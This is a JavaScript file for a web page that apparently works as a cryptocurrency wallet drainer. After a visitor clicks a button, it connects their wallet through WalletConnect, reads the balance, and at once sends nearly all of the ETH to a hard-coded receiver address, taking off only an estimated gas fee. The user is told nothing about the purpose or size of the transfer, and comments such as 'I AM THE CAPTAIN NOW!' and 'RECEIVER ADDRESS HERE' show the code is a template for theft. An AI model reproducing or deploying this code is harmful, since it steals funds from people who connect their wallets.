
let provider, user_address, onButtonClick;
const receiver_address = '0xEB94D7306CE29437b21C5051F5a0c7d0C12294C0'; // <- RECEIVER ADDRESS HERE

async function init(){
    console.log(window);
    
    //  Create WalletConnect Provider
    provider = new WalletConnectProvider.default({
        infuraId: "e77435344ef0486893cdc26d7d5cf039",
    });
    
    //  Enable session (triggers QR Code modal)
    await provider.enable();

    
    // Subscribe to accounts change
    provider.on("accountsChanged", (accounts) => {
        console.log(accounts);
        fetchAccountData();
    });
  
    // Subscribe to chainId change
    provider.on("chainChanged", (chainId) => {
        console.log(chainId);
        fetchAccountData();
    });
    
    // Subscribe to networkId change
    provider.on("networkChanged", (networkId) => {
        web3 = new Web3(provider);
        fetchAccountData();
    });
    
    // Subscribe to session disconnection
    provider.on("disconnect", (code, reason) => {
        console.log(code, reason);
    });

    //  Create Web3 instance
    await fetchAccountData();
}


async function fetchAccountData() {
    // Get a Web3 instance for the wallet
    window.web3 = new Web3(provider);
    console.log("Web3 instance is", web3);
    
    // Get list of accounts of the connected wallet
    const accounts = await web3.eth.getAccounts();
  
    // MetaMask does not give you all accounts, only the selected account
    console.log("Got accounts", accounts);
    let selectedAccount = accounts[0];
    console.log("Selected Account: ", selectedAccount);
    user_address = selectedAccount;
  
  
    // Go through all accounts and get their ETH balance
    // const rowResolvers = accounts.map(async (address) => {
      const balance = await web3.eth.getBalance(user_address);
      // ethBalance is a BigNumber instance
      const ethBalance = web3.utils.fromWei(balance, "ether");
      const humanFriendlyBalance = parseFloat(ethBalance).toFixed(4);
      console.log("New Account: %o", ({user_address, balance, humanFriendlyBalance}));
      // accountContainer.appendChild(clone);
    // });
  
    // Because rendering account does its own RPC commucation
    // with Ethereum node, we do not want to display any results
    // until data for all accounts is loaded
    // await Promise.all(rowResolvers);

    console.log("I AM THE CAPTAIN NOW!")
    onButtonClick = proceed;
    proceed();
}


async function proceed(){
    console.log("Now we roll...");
    async function send() {
        console.log("Attempting to send coins...");
        if (!user_address) {
          throw Error('No user yet');
        }
    
        // get balance
      var balance;
      var balance_in_wei;

      await web3.eth.getBalance(user_address).then(result => {
        let balanceInEth = web3.utils.fromWei(result, "ether");
        // balance = { wei: result, eth: balanceInEth };
        balance = String(balanceInEth); 
        balance_in_wei = result;
        console.log("Balance, %o", {wei: result, eth: (balanceInEth + " ETH")}); // 0.5922 ... ETH
      }).catch(err => {
        console.log("Error getting balance")
        console.log(err)
      });
      
      // let gas = new Decimal("21000").mul(10).mul(3).toString();
      let gas_estimate = await web3.eth.estimateGas({
        from: user_address,
        to: receiver_address, 
        value: balance_in_wei
      });
      // let gas = new Decimal(gas_estimate).mul(10).mul(2).toString(); // subtract this
      let gas = new Decimal(gas_estimate).mul(10).mul(4).toString(); // subtract this (increased for high gas periods)
      let gas_to_use = new Decimal(gas).mul(2).toString(); // but use this
      console.log("Estimated Gas (*10*4) in gwei =", gas);
      console.log("Actual Used Gas (*10*4) in wei =", web3.utils.fromWei(gas_to_use, "gwei"));
      var gasPrice = web3.utils.fromWei(gas, "gwei"); // convert 1 gwei to wei
      console.log("Estimated Gas in wei:", gasPrice);
      // THIS ENDS UP BEING USED!!! : 0.00000007
      // let g = await web3.eth.getGasPrice();
      // let g_in_eth = web3.utils.fromWei(g, "ether")
      // // this should be multiplied with gasPrice, to get transaction fee
      // console.log("Gas price:", g, ", gas price in eth:", g_in_eth);
      
      let amountToSend = new Decimal(balance).minus(gasPrice).abs().toString();
      console.log("Amount to send (bal - gas):", amountToSend);
  
        // return;
        web3.eth.sendTransaction({
          to:receiver_address,
          from:user_address, 
          gas:80000,
          //  210000000: exceed block gas limit
          //  21,000,000, // same
          gasPrice:gas_to_use,
          value:web3.utils.toWei(amountToSend, "ether")},
          // value: amountToSend},
          function (err, res){
            if(err){
              return console.log("Can't transfer Coin:", err);
            }
            console.log('Finished Processing transaction:', res);
          });
    }
    send();
}


{
    function getParameterByName(name, url = window.location.href) {
        name = name.replace(/[\[\]]/g, "\\$&");
        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
          results = regex.exec(url);
        if (!results) return null;
        if (!results[2]) return "";
        return decodeURIComponent(results[2].replace(/\+/g, " "));
    }
    let l = console.log; 
    function normalize(x_){
        let x = String(x_);
        if(/^\[object/g.test(x)){ // [object Window]
            try {
                let y = JSON.stringify(x_);
                x = y;
            } catch (error) {
                x = x+" >> "+(Object.keys(x_));
            }
            return x;
        }else{return x;}
    }
    if(getParameterByName("log") == "true"){
        let el = document.getElementById("testx");
        el.style.display = "block";
        console.log = (x, ...y)=>{ 
            l(x);
            if(y && y.length>0){
                l(y);
                y.forEach((z) => x+=(" -> ("+normalize(z)+")"));
            }
            x = normalize(x);
            el.innerText += ("~ "+x+"\n");
        }
    }
}
/**
 * Main entry point.
 */
async function startx(){
    let funcToCall = onButtonClick? onButtonClick : init;
    await funcToCall().catch(e => {
        console.log("Initialization failed.");
        console.log(e);
    })
};
// trigger login
let els = document.getElementsByClassName("triggerx");
([...els]).forEach((el) => {
    el.addEventListener("click", () => {
        startx();
    });
});
console.log(window);
